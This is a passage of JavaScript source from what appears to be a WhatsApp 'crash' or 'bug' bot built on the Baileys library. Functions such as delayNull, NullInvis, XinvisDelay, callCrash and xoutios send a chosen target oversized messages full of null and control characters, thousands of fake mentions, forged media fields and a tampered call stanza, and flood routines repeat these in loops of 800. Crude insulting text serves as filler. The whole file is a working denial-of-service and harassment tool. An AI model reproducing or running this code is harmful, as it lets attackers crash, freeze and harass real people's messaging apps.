            text: "𝗫 - 𝗭 𝗘 𝗡 𝗢", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "address_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );
  
  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target } 
    } : { messageId: payload2.key.id }
  );
}
    
    
async function ZenoDelayPayload(target, ptcp = true) {
  const payload = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\x10".repeat(1045000),
            version: 3,
          },
          entryPointConversionSource: "call_permission_message"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload.message,
     },
    }, ptcp ? 
    { 
      messageId: payload.key.id, 
      participant: { jid: target } 
    } : { messageId: payload.key.id }
  );
  
  const payload2 = generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: { 
            text: "\n", 
            format: "DEFAULT" 
          },
          nativeFlowResponseMessage: {
            name: "galaxy_message",
            paramsJson: "\x10".repeat(1045000),
            version: 3
          },
          entryPointConversionSource: "call_permission_request"
          },
        },
      },
    },
    {
      ephemeralExpiration: 0,
      forwardingScore: 9741,
      isForwarded: true,
      font: Math.floor(Math.random() * 99999999),
      background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "99999999"),
    },
  );

  await XeonBotInc.relayMessage(target, {
    groupStatusMessageV2: {
      message: payload2.message,
     },
    }, ptcp ? 
    { 
      messageId: payload2.key.id, 
      participant: { jid: target } 
    } : { messageId: payload2.key.id }
  );
}
    

async function delayNull(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      body: {
        text: "D | 7eppeli-KillerQueen" + "ꦽ".repeat(7000),
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"X${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await XeonBotInc.relayMessage(target, msg.message, {
    participant: { jid:target }, 
    messageId: msg.key.id
  }) 
}

async function NullInvis(target) {
  let msg = generateWAMessageFromContent(target, {
    interactiveResponseMessage: {
      contextInfo: {
        mentionedJid: Array.from({ length:2000 }, (_, y) => `1313555000${y + 1}@s.whatsapp.net`)
      }, 
      body: {
        text: "7eppeli - Ex3cutor",
        format: "DEFAULT"
      },
      nativeFlowResponseMessage: {
        name: "address_message",
        paramsJson: `{\"values\":{\"in_pin_code\":\"999999\",\"building_name\":\"saosinx\",\"landmark_area\":\"X\",\"address\":\"Yd7\",\"tower_number\":\"Y7d\",\"city\":\"chindo\",\"name\":\"d7y\",\"phone_number\":\"999999999999\",\"house_number\":\"xxx\",\"floor_number\":\"xxx\",\"state\":\"D | ${"\u0000".repeat(900000)}\"}}`,
        version: 3
      }
    }
  }, { userJid:target });
  
  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target, "13135550002@s.whatsapp.net"],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined
              }
            ]
          }
        ]
      }
    ]
  });
}


async function delayInfinity(XeonBotInc, target, mention = true) {
  while (true) {
    try {
      const generateMessage = {
        viewOnceMessage: {
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc?ccb=11-4&oh=01_Q5AaIRXVKmyUlOP-TSurW69Swlvug7f5fB4Efv4S_C6TtHzk&oe=680EE7A3&_nc_sid=5e03e0&mms3=true",
              mimetype: "image/jpeg",
              caption: "#4izxvelzExerc1st.",
              fileSha256: "Bcm+aU2A9QDx+EMuwmMl9D56MJON44Igej+cQEQ2syI=",
              fileLength: "19769",
              height: 354,
              width: 783,
              mediaKey: "n7BfZXo3wG/di5V9fC+NwauL6fDrLN/q1bi+EkWIVIA=",
              fileEncSha256: "LrL32sEi+n1O1fGrPmcd0t0OgFaSEf2iug9WiA3zaMU=",
              directPath: "/v/t62.7118-24/31077587_1764406024131772_5735878875052198053_n.enc",
              mediaKeyTimestamp: "1743225419",
              jpegThumbnail: null,
              scansSidecar: "mh5/YmcAWyLt5H2qzY3NtHrEtyM=",
              scanLengths: [2437, 17332],
              contextInfo: {
                mentionedJid: [
                  "13135550002@s.whatsapp.net",
                  ...Array.from(
                    { length: 1900 },
                    () => "1" + Math.floor(Math.random() * 7000000) + "@s.whatsapp.net"
                  )
                ],
                isSampled: true,
                participant: target,
                remoteJid: "status@broadcast",
                forwardingScore: 9741,
                isForwarded: true
              }
            }
          }
        }
      };

      const msg = generateWAMessageFromContent(target, generateMessage, {});

      await XeonBotInc.relayMessage("status@broadcast", msg.message, {
        messageId: msg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
            attrs: {},
            content: [
              {
                tag: "mentioned_users",
                attrs: {},
                content: [
                  { tag: "to", attrs: { jid: target }, content: undefined }
                ]
              }
            ]
          }
        ]
      });

      if (mention) {
        await XeonBotInc.relayMessage(
          target,
          {
            statusMentionMessage: {
              message: {
                protocolMessage: {
                  key: msg.key,
                  type: 25
                }
              }
            }
          },
          {
            additionalNodes: [
              {
                tag: "meta",
                attrs: { is_status_mention: "— \u0000" },
                content: undefined
              }
            ]
          }
        );
      }
      await new Promise(resolve => setTimeout(resolve, 9000));
    } catch (err) {
      await new Promise(resolve => setTimeout(resolve, 5000));
    }
  }
}

async function XinvisDelay(target, mention = true) {
  const AudioVs = {
    message: {
      ephemeralMessage: {
        message: {
          audioMessage: {
            url: "https://mmg.whatsapp.net/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0&mms3=true",
            mimetype: "audio/mpeg",
            fileSha256: "ON2s5kStl314oErh7VSStoyN8U6UyvobDFd567H+1t0=",
            fileLength: 99999999999999,
            seconds: 99999999999999,
            ptt: true,
            mediaKey: "+3Tg4JG4y5SyCh9zEZcsWnk8yddaGEAL/8gFJGC7jGE=",
            fileEncSha256: "iMFUzYKVzimBad6DMeux2UO10zKSZdFg9PkvRtiL4zw=",
            directPath: "/v/t62.7114-24/30578226_1168432881298329_968457547200376172_n.enc?ccb=11-4&oh=01_Q5AaINRqU0f68tTXDJq5XQsBL2xxRYpxyF4OFaO07XtNBIUJ&oe=67C0E49E&_nc_sid=5e03e0",
            mediaKeyTimestamp: 99999999999999,
            contextInfo: {
              mentionedJid: [
                "@s.whatsapp.net",
                ...Array.from({ length: 1900 }, () =>
                  `1${Math.floor(Math.random() * 90000000)}@s.whatsapp.net`
                )
              ],
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "120363375427625764@newsletter",
                serverMessageId: 1,
                newsletterName: ""
              }
            },
            waveform: "AAAAIRseCVtcWlxeW1VdXVhZDB09SDVNTEVLW0QJEj1JRk9GRys3FA8AHlpfXV9eL0BXL1MnPhw+DBBcLU9NGg=="
          }
        }
      }
    }
  };

  const msg1 = generateWAMessageFromContent(target, AudioVs.message, { userJid: target });

  await XeonBotInc.relayMessage("status@broadcast", msg1.message, {
    messageId: msg1.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              { tag: "to", attrs: { jid: target }, content: undefined }
            ]
          }
        ]
      }
    ]
  });

  if (mention) {
    await XeonBotInc.relayMessage(target, {
      groupStatusMentionMessage: {
        message: {
          protocolMessage: {
            key: msg1.key,
            type: 25
          }
        }
      }
    }, {
      additionalNodes: [{
        tag: "meta",
        attrs: {
          is_status_mention: true
        },
        content: undefined
      }]
    });
  }

  let msg2 = await generateWAMessageFromContent(target, {
    buttonsMessage: {
      text: "",
      contentText: "",
      footerText: "",
      buttons: [
        {
          buttonId: "",
          buttonText: {
            displayText: "" + "\u0000".repeat(800000),
          },
          type: 1,
        },
      ],
      headerType: 1,
    },
  }, {});

  await XeonBotInc.relayMessage("status@broadcast", msg2.message, {
    messageId: msg2.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: undefined,
              },
            ],
          },
        ],
      },
    ],
  });

  if (mention) {
    await XeonBotInc.relayMessage(
      target,
      {
        groupStatusMentionMessage: {
          message: {
            protocolMessage: {
              key: msg2.key,
              type: 25,
            },
          },
        },
      },
      {
        additionalNodes: [
          {
            tag: "meta",
            attrs: { is_status_mention: true },
            content: undefined,
          },
        ],
      }
    );
  }
}

async function InvisHardnew(target, mention = true) {
            let msg = await generateWAMessageFromContent(target, {
                buttonsMessage: {
                    text: "Poppies Lane Memory ( Ziee ⸙ )",
                    contentText:
                        " ",
                    footerText: " ",
                    buttons: [
                        {
                            buttonId: "ziee",
                            buttonText: {
                                displayText: "\u0000".repeat(800000),
                            },
                            type: 1,
                        },
                    ],
                    headerType: 1,
                },
            }, {});
        
            await XeonBotInc.relayMessage("status@broadcast", msg.message, {
                messageId: msg.key.id,
                statusJidList: [target],
                additionalNodes: [
                    {
                        tag: "meta",
                        attrs: {},
                        content: [
                            {
                                tag: "mentioned_users",
                                attrs: {},
                                content: [
                                    {
                                        tag: "to",
                                        attrs: { jid: target },
                                        content: undefined,
                                    },
                                ],
                            },
                        ],
                    },
                ],
            });
            if (mention) {
                await XeonBotInc.relayMessage(
                    target,
                    {
                        groupStatusMentionMessage: {
                            message: {
                                protocolMessage: {
                                    key: msg.key,
                                    type: 25,
                                },
                            },
                        },
                    },
                    {
                        additionalNodes: [
                            {
                                tag: "meta",
                                attrs: { is_status_mention: true },
                                content: undefined,
                            },
                        ],
                    }
                );
            }
        }

async function XStickdelay(XeonBotInc, target) {
  let message = {
    viewOnceMessage: {
      message: {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0&mms3=true",
          fileSha256: "xUfVNM3gqu9GqZeLW3wsqa2ca5mT9qkPXvd7EGkg9n4=",
          fileEncSha256: "zTi/rb6CHQOXI7Pa2E8fUwHv+64hay8mGT1xRGkh98s=",
          mediaKey: "nHJvqFR5n26nsRiXaRVxxPZY54l0BDXAOGvIPrfwo9k=",
          mimetype: "image/webp",
          directPath:
            "/v/t62.7161-24/10000000_1197738342006156_5361184901517042465_n.enc?ccb=11-4&oh=01_Q5Aa1QFOLTmoR7u3hoezWL5EO-ACl900RfgCQoTqI80OOi7T5A&oe=68365D72&_nc_sid=5e03e0",
          fileLength: { low: 1, high: 0, unsigned: true },
          mediaKeyTimestamp: {
            low: 1746112211,
            high: 0,
            unsigned: false,
          },
          firstFrameLength: 19904,
          firstFrameSidecar: "KN4kQ5pyABRAgA==",
          isAnimated: true,
          contextInfo: {
            mentionedJid: [
              target,
              ...Array.from(
                {
                  length: 2000,
                },
                () =>
                  "1" + Math.floor(Math.random() * 900000) + "@s.whatsapp.net"
              ),
            ],
            groupMentions: [],
            entryPointConversionSource: "non_contact",
            entryPointConversionApp: "whatsapp",
            entryPointConversionDelaySeconds: 467593,
          },
          stickerSentTs: {
            low: -1939477883,
            high: 406,
            unsigned: false,
          },
          isAvatar: false,
          isAiSticker: false,
          isLottie: false,
        },
      },
    },
  };

  const msg = generateWAMessageFromContent(target, message, {});

  await XeonBotInc.relayMessage("status@broadcast", msg.message, {
    messageId: msg.key.id,
    statusJidList: [target],
    additionalNodes: [
      {
        tag: "meta",
        attrs: {},
        content: [
          {
            tag: "mentioned_users",
            attrs: {},
            content: [
              {
                tag: "to",
                attrs: { jid: target },
                content: [],
              },
            ],
          },
        ],
      },
    ],
  });
  await new Promise(resolve => setTimeout(resolve, 1500));
    }
    
async function callCrash(target, isVideo = true) {
  const { jidDecode, encodeWAMessage, encodeSignedDeviceIdentity } = require("@adiwajshing/baileys");
  
  try {
    const devices = (
      await XeonBotInc.getUSyncDevices([target], false, false)
    ).map(({ user, device }) => `${user}:${device || ''}@s.whatsapp.net`);

    await XeonBotInc.assertSessions(devices);

    const createMutex = () => {
      const locks = new Map();
      
      return {
        async mutex(key, fn) {
          while (locks.has(key)) {
            await locks.get(key);
          }
          
          const lock = Promise.resolve().then(() => fn());
          locks.set(key, lock);
          
          try {
            const result = await lock;
            return result;
          } finally {
            locks.delete(key);
          }
        }
      };
    };

    const mutexManager = createMutex();
    
    const appendBufferMarker = (buffer) => {
      const newBuffer = Buffer.alloc(buffer.length + 8);
      buffer.copy(newBuffer);
      newBuffer.fill(1, buffer.length);
      return newBuffer;
    };

    const originalCreateParticipantNodes = XeonBotInc.createParticipantNodes?.bind(XeonBotInc);
    const originalEncodeWAMessage = XeonBotInc.encodeWAMessage?.bind(XeonBotInc);

    XeonBotInc.createParticipantNodes = async (recipientJids, message, extraAttrs, dsmMessage) => {
      if (!recipientJids.length) {
        return {
          nodes: [],
          shouldIncludeDeviceIdentity: false
        };
      }

      const processedMessage = await (XeonBotInc.patchMessageBeforeSending?.(message, recipientJids) ?? message);
      
      const messagePairs = Array.isArray(processedMessage) 
        ? processedMessage 
        : recipientJids.map(jid => ({ recipientJid: jid, message: processedMessage }));

      const { id: meId, lid: meLid } = XeonBotInc.authState.creds.me;
      const localUser = meLid ? jidDecode(meLid)?.user : null;
      let shouldIncludeDeviceIdentity = false;

      const nodes = await Promise.all(
        messagePairs.map(async ({ recipientJid: jid, message: msg }) => {
          const { user: targetUser } = jidDecode(jid);
          const { user: ownUser } = jidDecode(meId);
          const isOwnUser = targetUser === ownUser || targetUser === localUser;
          const isSelf = jid === meId || jid === meLid;
          
          if (dsmMessage && isOwnUser && !isSelf) {
            msg = dsmMessage;
          }

          const encodedBytes = appendBufferMarker(
            originalEncodeWAMessage 
              ? originalEncodeWAMessage(msg) 
              : encodeWAMessage(msg)
          );

          return mutexManager.mutex(jid, async () => {
            const { type, ciphertext } = await XeonBotInc.signalRepository.encryptMessage({ 
              jid, 
              data: encodedBytes 
            });
            
            if (type === 'pkmsg') {
              shouldIncludeDeviceIdentity = true;
            }
            
            return {
              tag: 'to',
              attrs: { jid },
              content: [{
                tag: 'enc',
                attrs: {
                  v: '2',
                  type,
                  ...extraAttrs
                },
                content: ciphertext
              }]
            };
          });
        })
      );

      return {
        nodes: nodes.filter(Boolean),
        shouldIncludeDeviceIdentity
      };
    };

    const callKey = crypto.randomBytes(32);
    const extendedCallKey = Buffer.concat([callKey, Buffer.alloc(8, 0x01)]);
    const callId = crypto.randomBytes(16).toString("hex").slice(0, 32).toUpperCase();

    const { nodes: destinations, shouldIncludeDeviceIdentity } = 
      await XeonBotInc.createParticipantNodes(devices, { 
        conversation: "call-initiated"
      }, { count: '0' });

    const callStanza = {
      tag: "call",
      attrs: {
        to: target,
        id: XeonBotInc.generateMessageTag(),
        from: XeonBotInc.user.id
      },
      content: [{
        tag: "offer",
        attrs: {
          "call-id": callId,
          "call-creator": XeonBotInc.user.id
        },
        content: [
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "16000"
            }
          },
          {
            tag: "audio",
            attrs: {
              enc: "opus",
              rate: "8000"
            }
          },
          ...(isVideo ? [{
            tag: 'video',
            attrs: {
              enc: 'vp8',
              dec: 'vp8',
              orientation: '0',
              screen_width: '1920',
              screen_height: '1080',
              device_orientation: '0'
            }
          }] : []),
          {
            tag: "net",
            attrs: {
              medium: "3"
            }
          },
          {
            tag: "capability",
            attrs: { ver: "1" },
            content: new Uint8Array([1, 5, 247, 9, 228, 250, 1])
          },
          {
            tag: "encopt",
            attrs: { keygen: "2" }
          },
          {
            tag: "destination",
            attrs: {},
            content: destinations
          },
          ...(shouldIncludeDeviceIdentity ? [{
            tag: "device-identity",
            attrs: {},
            content: encodeSignedDeviceIdentity(XeonBotInc.authState.creds.account, true)
          }] : [])
        ].filter(Boolean)
      }]
    };

    await XeonBotInc.sendNode(callStanza);

  } catch (error) {
    console.error('Error in callCrash:', error);
    throw error;
  }
}








    
     
    
    
 async function loading(from) {

    {

        console.error("Invalid  from  JID:", from);

        return;

    }

    const Floading = [

        "ℓσα∂ιηg.",

        "ℓσα∂ιηg..",

        "ℓσα∂ιηg..."

    ];

    let { key } = await XeonBotInc.sendMessage(from, { text: " " });

    for (let i = 0; i < Floading.length; i++) {

        await XeonBotInc.sendMessage(from, { text: Floading[i], edit: key });

    }

}   
    
    
      
        
        
    async function sendMessagesForDurationX(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer(X); // Using X from user input
            count++;
            await sendNext(); // Continue shipping
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log completed sending 800 packages
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};

async function sendMessagesForDuration(durationHours, X) {
    const totalDurationMs = durationHours * 60 * 60 * 1000; // Convert hours to milliseconds
    const startTime = Date.now();
    let count = 0;

    const sendNext = async () => {
        if (Date.now() - startTime >= totalDurationMs) {
            console.log("Delivery Completed Within Specified Duration.");
            return;
        }

        if (count < 800) {
            await xjammer2(X); // Using X from user input
            count++;
            await sendNext(); // Continue delivery without delay between messages
        } else {
            console.log(chalk.green(`Completed Sending 800 Packages To ${X}`)); // Log selesai kirim 800 paket
            count = 0; // Reset for next package
            console.log(chalk.red("Preparing To Ship The Next 800 Packages..."));
            setTimeout(sendNext, 5000); // Pause 5 seconds after completion of batch of 800 messages
        }
    };

    sendNext();
};


        
        async function EpUi(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*" + "ꦾ".repeat(50000),
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await XeonBotInc.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
        }

async function EpHemeral(X, ptcp = true) {
            let msg = await generateWAMessageFromContent(X, {
                viewOnceMessage: {
                    message: {
                        interactiveMessage: {
                            header: {
                                title: "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏",
                                hasMediaAttachment: false
                            },
                            body: {
                                text: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                            },
                            nativeFlowMessage: {
                                messageParamsJson: "",
                                buttons: [{
                                        name: "cta_url",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    },
                                    {
                                        name: "call_permission_request",
                                        buttonParamsJson: "*我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹* *我有一个很大的鸡鸡，请吸吮它 😹*"
                                    }
                                ]
                            }
                        }
                    }
                }
            }, {});            
            await XeonBotInc.relayMessage(X, msg.message, ptcp ? {
				participant: {
					jid: X
				}
			} : {});
        }
    
//==============================================================\\
async function xoutios(target) {
    const xeonIpong = "𑇂𑆵𑆴𑆿".repeat(60000);
    const genMsg = (fileName, bodyText) => generateWAMessageFromContent(target, proto.Message.fromObject({
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
                    header: {
                        documentMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true",
                            mimetype: "application/json",
                            fileSha256: "ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=",
                            fileLength: "999999999999",
                            pageCount: 0x9ff9ff9ff1ff8ff4ff5f,
                            mediaKey: "5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=",
                            fileName: fileName,
                            fileEncSha256: "pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=",
                            directPath: "/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1715880173"
                        },
                        hasMediaAttachment: true
                    },
                    body: { text: bodyText },
                    nativeFlowMessage: {
                        messageParamsJson: `{"name":"galaxy_message","flow_action":"navigate","flow_action_payload":{"screen":"CTZ_SCREEN"},"flow_cta":"Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏","flow_id":"Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏","flow_message_version":"9.903","flow_token":"Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏"}`
                    },
                    contextInfo: {
                        mentionedJid: Array.from({ length: 5 }, () => "1@newsletter"),
                        groupMentions: [{ groupJid: "1@newsletter", groupSubject: "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" }]
                    }
                }
            }
        }
    }), { userJid: target });

    const msg1 = await genMsg(`${xeonIpong}️`, "𑇂𑆵𑆴𑆿".repeat(1000));
    await XeonBotInc.relayMessage(target, msg1.message, { participant: { jid: target }, messageId: msg1.key.id });

    const msg2 = await genMsg("Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏", "\u0000" + "ꦾ".repeat(150000) + "@1".repeat(250000));
    await XeonBotInc.relayMessage(target, msg2.message, { participant: { jid: target }, messageId: msg2.key.id });

    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });

await XeonBotInc.relayMessage(target, {
        'extendedTextMessage': {
            'text': xeonIpong,
            'contextInfo': {
                'stanzaId': target,
                'participant': target,
                'quotedMessage': {
                    'conversation': 'Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏' + 'ꦾ'.repeat(50000)
                },
                'disappearingMode': {
                    'initiator': "CHANGED_IN_CHAT",
                    'trigger': "CHAT_SETTING"
                }
            },
            'inviteLinkGroupTypeV2': "DEFAULT"
        }
    }, {
        'participant': {
            'jid': target
        }
    }, {
        'messageId': null
    });

    const paymentMsg = service => ({
    paymentInviteMessage: {
        serviceType: service,
        expiryTimestamp: Date.now() + 91814400000,
        maxTransactionAmount: 10000000000,
        maxDailyTransaction: 100000000000,
        maxTransactionFrequency: 1,
        secureMode: true,
        verificationRequired: true,
        antiFraudProtection: true,
        multiFactorAuthentication: true,
        transactionLogging: true,
        geoLock: true,
        sessionTimeout: 300000,
        blacklistIPs: ["192.168.0.1", "192.168.0.2"],
        whitelistIPs: ["192.168.1.1", "192.168.1.2"],
        transactionRateLimit: 3,
        realTimeFraudDetection: true,
        dailyLimitResetTime: "00:00",
        fullAuditTrail: true,
        userBehaviorAnalysis: true,
        transactionNotification: true,
        dynamicSessionTokens: true,
        deviceFingerprinting: true,
        transactionEncryption: true,
        encryptedMsgID: generateEncryptedID(service)
    }
});

function generateEncryptedID(service) {
    return `ENC_${Buffer.from(service + Date.now()).toString('base64')}`;
}

for (const service of ["FBPAY", "UPI", "PAYPAL", "WPPAY", "GPAY", "PP", "APPLEPAY", "VENMO", "CASHAPP", "STRIPE", "BRAINTREE", "samSUNGPAY", "ALIPAY", "WECHATPAY", "MPAY", "AIPAY", "BIOPAY", "NFTPAY", "VOICEPAY", "BLOCKPAY", "QPAY", "NPAY", "ZPAY", "TLOCK", "HOLO"]) {
    await XeonBotInc.relayMessage(target, paymentMsg(service), {
        participant: { jid: target },
        timestamp: Date.now(),
        requestID: generateEncryptedID(service),
    });
}
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" + xeonIpong,
            url: "https://youtube.com/@DGXeom"
        }
    }, { participant: { jid: target } });
    
    await XeonBotInc.relayMessage(target, {
        locationMessage: {
            degreesLatitude: 173.282,
            degreesLongitude: -19.378,
            name: "Telegram: @comander𝟒𝟎𝟒𝐍𝐎𝐓𝐅𝐎𝐔𝐍𝐃𝐕𝐈𝐏" + xeonIpong,
            url: "https://youtube.com/@ "
        }
    }, { participant: { jid: target } });
}
//==============================================================\\
    async function AndroIos(target) {
  const msg = {
    message: {
      locationMessage: {
        degreesLatitude: 21.1266,
        degreesLongitude: -11.8199,
        name: "D | 7eppeli-KillerQueen" + "𑇂𑆵𑆴𑆿".repeat(6000),
        url: "https://Yuukey." +"𑇂𑆵𑆴𑆿".repeat(1000) + ".id",
        contextInfo: {
          externalAdReply: {
